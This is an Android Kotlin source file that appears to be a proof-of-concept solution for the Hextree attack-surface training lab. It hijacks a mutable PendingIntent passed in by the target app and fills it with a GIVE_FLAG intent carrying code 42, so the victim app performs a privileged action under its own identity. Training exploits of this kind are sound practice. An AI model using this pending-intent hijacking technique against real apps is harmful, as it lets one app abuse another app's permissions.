package com.vishal2376.hextreepoc

import android.app.PendingIntent
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class PendingIntentActivity : AppCompatActivity() {
	override fun onCreate(savedInstanceState: Bundle?) {
		super.onCreate(savedInstanceState)

		Utils.showDialog(this, intent)

		when (intent.action) {
			"io.hextree.attacksurface.MUTATE_ME" -> {
				val pendingIntent = intent.getParcelableExtra<PendingIntent>("pending_intent")
				val customIntent = Intent("io.hextree.attacksurface.GIVE_FLAG").apply {
					putExtra("code", 42)
				}

				pendingIntent?.send(this, 0, customIntent)
				finish()
			}
		}
	}
}